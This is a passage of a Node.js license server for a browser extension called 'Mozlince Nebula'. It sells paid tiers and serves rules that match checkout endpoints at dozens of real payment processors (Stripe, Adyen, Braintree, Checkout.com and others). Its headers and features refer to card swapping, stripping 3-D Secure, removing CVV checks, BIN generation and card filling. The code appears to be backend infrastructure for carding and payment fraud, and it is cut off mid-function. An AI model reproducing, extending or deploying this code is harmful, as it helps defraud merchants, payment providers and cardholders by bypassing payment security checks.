/* ═══════════════════════════════════════════════════════════════
   ✦ MOZLINCE NEBULA  ·  v8.4.2 QUANTUM+
   © Asheo Systems · Premium License Engine
   ───────────────────────────────────────────────────────────────
   ◈ v8.4.2: manifest JWT, /v1/version latest, __asheo parse,
             headers x-asheo-* completos, anti-replay nonce,
             entitlement free correto, sem vazamento de rules
   ═══════════════════════════════════════════════════════════════ */
require('dotenv').config();
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
const ALLOWED_HEADERS = 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Asheo-Pass, X-Install-Id, X-Client-Tag, X-License-Key, X-Request-Id, Accept-Language, Accept-Encoding, x-asheo-target, x-asheo-method, x-asheo-install, x-asheo-ts, x-asheo-sig, x-asheo-build, x-asheo-nonce, x-asheo-origin, x-asheo-auth, x-asheo-bin, x-asheo-card, x-asheo-clientkey, x-asheo-special-hosts, x-asheo-headers, x-asheo-swap-only, x-asheo-3ds-strip, x-asheo-remove-cvv, x-asheo-bt-host, x-asheo-pack-fmt, x-asheo-attest, x-asheo-session, x-asheo-replay';

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', ALLOWED_HEADERS);
  res.setHeader('Access-Control-Expose-Headers', 'Content-Length, Content-Encoding, X-Request-Id, x-asheo-proxied, x-asheo-swapped, x-asheo-swap-ok, x-asheo-pack-fmt, x-asheo-upstream-status, x-asheo-elapsed-ms, x-asheo-3ds2-verdict, x-asheo-adyen-verdict, x-asheo-adyen-result, x-asheo-adyen-reason');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('X-Powered-By', 'Mozlince-Nebula/8.4.2');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.json({ limit: '2mb', verify: (req,res,buf) => { req.rawBody = buf; } }));
app.use(express.urlencoded({ extended: false, limit: '2mb', verify: (req,res,buf) => { req.rawBody = buf; } }));
app.use(express.text({ type: ['text/*'], limit: '2mb', verify: (req,res,buf) => { req.rawBody = buf; } }));

const C = { r:'\x1b[0m', b:'\x1b[1m', d:'\x1b[2m', gray:'\x1b[38;5;245m', dim:'\x1b[38;5;240m', violet:'\x1b[38;5;99m', violetB:'\x1b[38;5;135m', cyan:'\x1b[38;5;45m', cyanB:'\x1b[38;5;51m', gold:'\x1b[38;5;220m', goldB:'\x1b[38;5;226m', mint:'\x1b[38;5;121m', green:'\x1b[38;5;46m', rose:'\x1b[38;5;204m', red:'\x1b[38;5;196m', amber:'\x1b[38;5;214m', blue:'\x1b[38;5;39m' };
const TAGS = { INFO:C.cyanB, OK:C.green, WARN:C.amber, ERRO:C.red, SYS:C.violetB, ATIV:C.blue, BOT:C.cyanB, FEAT:C.rose, BOOT:C.mint, API:C.gold, DBG:C.dim, TG:C.cyanB, SUPPORT:C.gold, I18N:C.blue, RULES:C.rose, DM:C.rose, GW:C.cyanB, HMAC:C.amber, PROXY:C.violetB, GZIP:C.mint };
function log(t, m) { const ts = new Date().toISOString().replace('T',' ').substring(0,19); const tag = (TAGS[t]||C.gray) + C.b + '▸ ' + t.padEnd(7) + C.r; console.log(`${C.dim}${ts}${C.r} ${tag} ${m}`); }
function banner() {
  console.log(`\n${C.violet}   ╭──────────────────────────────────────────────╮${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.cyanB}${C.b}◈  MOZLINCE${C.r}  ${C.goldB}${C.b}NEBULA${C.r}  ${C.dim}·${C.r}  ${C.gold}v8.4.2${C.r} ${C.dim}QUANTUM+${C.r} ${C.violet}│${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.dim}Premium License Engine · Asheo Systems${C.r}     ${C.violet}│${C.r}`);
  console.log(`${C.violet}   ╰──────────────────────────────────────────────╯${C.r}\n`);
}

let PRIVATE_KEY = null, PUBLIC_KEY = null, ORIGEM = 'nenhuma';
(function initKeys() {
  const fp = ['/etc/secrets/private.pem','./private.pem','/etc/secrets/ec_private.pem'];
  const fu = ['/etc/secrets/public.pem','./public.pem','/etc/secrets/ec_public.pem'];
  for (const f of fp) { try { if (fs.existsSync(f)) { PRIVATE_KEY = fs.readFileSync(f,'utf8').trim(); ORIGEM='file:'+f; break; } } catch {} }
  for (const f of fu) { try { if (fs.existsSync(f)) { PUBLIC_KEY = fs.readFileSync(f,'utf8').trim(); break; } } catch {} }
  if (!PRIVATE_KEY) { let p = process.env.EC_PRIVATE_KEY || process.env.JWT_PRIVATE_KEY_PEM || ''; if (p) { if (!p.includes('BEGIN')) { try { p = Buffer.from(p.trim(),'base64').toString('utf8'); } catch {} } PRIVATE_KEY = p.replace(/\\n/g,'\n').trim(); ORIGEM = 'env'; } }
  if (!PUBLIC_KEY) { let pu = process.env.EC_PUBLIC_KEY || process.env.JWT_PUBLIC_KEY_PEM || ''; if (pu) { if (!pu.includes('BEGIN')) { try { pu = Buffer.from(pu.trim(),'base64').toString('utf8'); } catch {} } PUBLIC_KEY = pu.replace(/\\n/g,'\n').trim(); } }
  if (PRIVATE_KEY) {
    try {
      const k = crypto.createPrivateKey(PRIVATE_KEY);
      const jwk = crypto.createPublicKey(k).export({ format:'jwk' });
      if (!PUBLIC_KEY) PUBLIC_KEY = crypto.createPublicKey(k).export({ type:'spki', format:'pem' });
      log('OK', `Chave privada carregada (${ORIGEM})`);
      if (jwk.x === 'aTAr_kSTrfocOkpAHlVSDc71E1pc5Pd5KgnE-ggBr_4' && jwk.y === 'GFrU897XAPvrxqcRhlwoAwpooKHl69-0YrBaJbfwAT4') {
        log('OK', '✔ Chave corresponde à extensão Mozlince');
      } else { log('WARN', '⚠ Chave diferente da extensão'); }
    } catch (e) { log('ERRO','Chave inválida: '+e.message); PRIVATE_KEY = null; }
  } else { log('ERRO','Nenhuma chave privada encontrada'); }
})();

const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL;
const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

const RULES_VERSION = 33;
const FEATURE_KEYS = ['browserMods','ruleOpsLab','liveHud','advancedProtection','apiAccess','experimentalFeatures'];
const CAPABILITY_KEYS = ['customEncryptedGateways','binGenerator','adyenGateway'];
const LIMIT_KEYS = ['binPool','ccQueue','ruleLimit','profileLimit','randomRouting'];
const PREMIUM_SCOPE = ['bypasser','cardfiller','cvv','premium','browserMods','persona','rules','gateways','exclusive'];
const PREMIUM_LIMITS = { binPool:null, ccQueue:null, ruleLimit:null, profileLimit:null, randomRouting:true };
const FREE_LIMITS = { binPool:2, ccQueue:10, ruleLimit:20, profileLimit:2, randomRouting:false };

const PACOTES = {
  '3d':   { nome:'3 Dias',    dias:3,     preco:3,   emoji:'◔', lifetime:false },
  '7d':   { nome:'7 Dias',    dias:7,     preco:5,   emoji:'◕', lifetime:false },
  '15d':  { nome:'15 Dias',   dias:15,    preco:7,   emoji:'◑', lifetime:false },
  '30d':  { nome:'30 Dias',   dias:30,    preco:12,  emoji:'◒', lifetime:false },
  '45d':  { nome:'45 Dias',   dias:45,    preco:17,  emoji:'◓', lifetime:false },
  '90d':  { nome:'3 Meses',   dias:90,    preco:30,  emoji:'✦', lifetime:false },
  '180d': { nome:'6 Meses',   dias:180,   preco:45,  emoji:'✧', lifetime:false },
  '1a':   { nome:'1 Ano',     dias:365,   preco:70,  emoji:'⟡', lifetime:false },
  'life': { nome:'LIFETIME',  dias:36500, preco:190, emoji:'∞', lifetime:true  }
};
const precoFmt = usd => `$${Number(usd).toFixed(2)}`;

const PAYMENT_RULES = [
  { defaultId:"stripe.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Stripe", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api\\.stripe\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"worldpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Worldpay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:hpp|payments|secure)\\.worldpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"endurance.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Endurance", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)securepay\\.svcs\\.endurance\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"safecharge.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Safecharge", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)secure\\.safecharge\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paddle.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Paddle", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)checkout-service\\.paddle\\.com\\/[^?#]*\\/pay(?:[?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"adyen.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Adyen", patternEnc:{kind:"regex",source:"https:\\/\\/(?:checkoutshopper-live(?:-[a-z0-9]+)?\\.adyen\\.com|checkoutshopper-live(?:-[a-z0-9]+)?\\.cdn\\.adyen\\.com)\\/(?:checkoutshopper\\/)?v\\d+\\/(?:sessions\\/[^/]+\\/)?payments(?:\\/details)?(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"boosteroid.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Boosteroid Adyen", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)cloud\\.boosteroid\\.com\\/api\\/v2\\/payments\\/adyen\\/subscription\\/create(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"chess.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Chess.com Adyen", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)www\\.chess\\.com\\/payment\\/adyen\\/pay(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"gog.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"GOG Adyen", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api\\.gog\\.com\\/v\\d+\\/checkout\\/[a-z0-9]+\\/payment(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"lootbar.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Lootbar", patternEnc:{kind:"regex",source:"api\\.lootbar\\.com\\/api\\/v2\\/asset\\/pay\\/adyen\\/card\\/request(?:[\\/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xsolla.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xsolla", patternEnc:{kind:"regex",source:"secure\\.xsolla\\.com\\/paystation2\\/api\\/.*$",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"recurly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Recurly", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:[a-z0-9.-]+\\.)?recurly\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tebex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Tebex", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)checkout\\.tebex\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nordpayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NordPayments", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)iframe-api\\.nordpayments\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["primary_account_number","expiration_year","expiration_month","cvv"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"grammerly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Grammarly", patternEnc:{kind:"regex",source:"gr4vy\\.app|gateway\\.grammarly\\.com|payments\\.grammarly\\.com",flags:"i"}, matchContentType:"application/json", requiredKeys:["payment_method.number","payment_method.expiration_date","payment_method.security_code"], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"rizzup.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"RizzUp", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)rizzup\\.net(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"fortis.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Fortis", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api\\.fortis\\.tech(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"jsbasistheory.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Basis Theory", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api|js)\\.basistheory\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"braintree.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Braintree", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)payments\\.braintree-api\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"mercadopago.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Mercado Pago", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api|sdk)\\.mercadopago\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xendit.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xendit", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api\\.xendit\\.co\\/v2\\/credit_card_tokens|pali-orchestrator-prod-live\\.xendit\\.co)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"razorpay.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Razorpay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api|checkout|cdn)\\.razorpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paystack.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Paystack", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:standard|api|checkout|js)\\.paystack\\.(?:co|com)(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"payu.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"PayU India", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:test|secure|info|uat-partner)\\.payu\\.in(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"epicgames.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Epic Games", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)payment-website-pci\\.ol\\.epicgames\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"appsnetpk.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"IPG (apps.net.pk)", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)ipg\\d*\\.apps\\.net\\.pk(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"primer.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Primer", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)sdk\\.api\\.primer\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bluesnap.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BlueSnap", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:www1\\.)?bluesnap\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["ccNumber"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bridgerpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BridgerPay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)checkout\\.bridgerpay\\.com\\/api\\/(?:v2\\/deposit\\/credit-card|n\\/payment-details-cache)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"spreedly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Spreedly", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)core\\.spreedly\\.com\\/v1\\/payment_methods(\\/restricted\\.json)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"openpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Openpay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:sandbox-)?api\\.openpay\\.(?:mx|co|pe|com)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:secure\\.)?nmi\\.com\\/api\\/transact\\.php",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.collectjs", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI CollectJS", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:secure\\.)?nmi\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tailoredpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TailoredPay", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)tailoredpay\\.transactiongateway\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"sagepay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Opayo (Sage Pay)", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:live|test|pi-live|pi-test)\\.sagepay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"viva.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Viva", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:demo-)?api\\.vivapayments\\.com\\/nativecheckout\\/v2\\/chargetokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"codapayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Codapayments", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api-tc|tc-api-card-sandbox)\\.codapayments\\.com\\/v1\\/(?:pub\\/)?direct\\/charges",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"checkout.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Checkout.com", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:api\\.(?:sandbox\\.)?|card-acquisition-gateway\\.)checkout\\.com\\/tokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"airwallex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Airwallex", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:[a-z0-9-]+\\.)*airwallex\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tokenex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TokenEx", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)htp\\.tokenex\\.com\\/iframe\\/v3",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"cashfree.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Cashfree", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:sandbox\\.|api\\.|sdk\\.|payments\\.)?cashfree\\.com\\/(?:checkout\\/api\\/checkouts\\/payments\\/?)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"zuora.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Zuora", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)rest\\.(?:[a-z0-9-]+\\.)*zuora\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"vgs.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"VGS", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:vgsapi\\.com|[a-z0-9-]+\\.(?:sandbox|live)\\.verygoodproxy\\.com)\\/cards(?:[/?#]|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"patreon.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Patreon", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)(?:www\\.)?patreon\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"authorizenet.default", defaultVersion:1, isDefault:true, enabled:true, name:"Authorize.Net", patternEnc:{kind:"regex",source:"(?:^|\\/\\/)api2\\.authorize\\.net\\/xml\\/v1\\/request\\.api",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"], swapCapable:false }
];

const EXCLUSIVE_TARGETS = [
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/sessions"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/paymentMethods"},
  {hostSuffix:"checkoutshopper-live-us.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live-eu.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"pal-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/pal/servlet/"},
  {hostSuffix:"pal-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/pal/servlet/"}
];

const GATEWAYS_META = [
  {id:'default-stripe',name:'Stripe',pattern:'https://js.stripe.com/*',enabled:true,isDefault:true},
  {id:'default-checkout',name:'Checkout.com',pattern:'https://*.checkout.com/*',enabled:true,isDefault:true},
  {id:'default-adyen',name:'Adyen',pattern:'https://*.adyen.com/*',enabled:true,isDefault:true},
  {id:'default-braintree',name:'Braintree',pattern:'https://*.braintreegateway.com/*',enabled:true,isDefault:true}
];

const CAMPAIGNS = [{id:'default-1',name:'Default Campaign',enabled:true,createdAt:new Date().toISOString()}];

function normalizeKey(k){ if(!k||typeof k!=='string')return ''; return k.trim().toUpperCase().replace(/\s+/g,'').replace(/[^A-Z0-9\-]/g,''); }
async function redisSet(key, value) { const k = encodeURIComponent(normalizeKey(key)); const r = await fetch(`${UPSTASH_URL}/set/${k}`, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}`, 'Content-Type':'text/plain' }, body: typeof value === 'string' ? value : JSON.stringify(value) }); return r.json(); }
async function redisGet(key) { const k = encodeURIComponent(normalizeKey(key)); if (!k) return null; const r = await fetch(`${UPSTASH_URL}/get/${k}`, { headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); const d = await r.json(); if (!d.result) return null; try { return migrarLicenca(JSON.parse(d.result)); } catch { return null; } }
async function redisDel(key) { const k = encodeURIComponent(normalizeKey(key)); await fetch(`${UPSTASH_URL}/del/${k}`, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); }
async function redisKeys(pattern='ASHEO-*') { const p = encodeURIComponent(pattern); const r = await fetch(`${UPSTASH_URL}/keys/${p}`, { headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); const d = await r.json(); return (d.result || []).filter(k => typeof k === 'string'); }
async function redisSetRaw(key, value) { const k = encodeURIComponent(normalizeKey(key)); const r = await fetch(`${UPSTASH_URL}/set/${k}`, { method:'POST', headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}`, 'Content-Type':'text/plain' }, body: typeof value === 'string' ? value : JSON.stringify(value) }); return r.json(); }
async function redisGetRaw(key) { const k = encodeURIComponent(normalizeKey(key)); if (!k) return null; const r = await fetch(`${UPSTASH_URL}/get/${k}`, { headers:{ Authorization:`Bearer ${UPSTASH_TOKEN}` } }); const d = await r.json(); if (!d.result) return null; try { return JSON.parse(d.result); } catch { return null; } }

function migrarLicenca(lic) {
  if (!lic || typeof lic !== 'object') return lic;
  const n = { ...lic };
  if (!n.plano && n.plan) n.plano = n.plan === 'premium' ? 'life' : n.plan;
  if (!n.plano) n.plano = '30d';
  const pk = PACOTES[n.plano];
  if (!n.planoNome) n.planoNome = pk ? pk.nome : 'Premium';
  if (typeof n.dias !== 'number') n.dias = pk ? pk.dias : 30;
  n.lifetime = n.plano === 'life';
  n.ilimitada = n.lifetime;
  if (!n.criadaEm && n.createdAt) n.criadaEm = n.createdAt;
  if (!n.criadaEm) n.criadaEm = Date.now();
  if (!n.expiraEm || (typeof n.expiraEm !== 'number')) { n.expiraEm = n.lifetime ? n.criadaEm + (100*365*24*60*60*1000) : n.criadaEm + (n.dias*24*60*60*1000); }
